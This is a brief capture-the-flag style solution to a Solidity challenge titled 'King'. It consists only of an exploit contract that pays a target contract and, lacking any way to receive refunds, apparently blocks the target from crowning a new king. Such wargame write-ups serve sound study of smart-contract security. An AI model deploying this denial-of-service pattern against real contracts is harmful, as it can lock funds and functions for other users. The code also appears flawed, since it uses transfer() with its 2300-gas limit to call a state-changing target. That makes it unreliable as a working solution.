# 9 - King

### Scripted Solution

```solidity
pragma solidity ^0.8.0;

contract KingExploit {
    address private kingContractAddress;

    constructor(address contractAddress) {
        kingContractAddress = contractAddress;
    }

    function payKingContract() public payable {
        address payable to = payable(kingContractAddress);
        to.transfer(msg.value);
    }
}
```
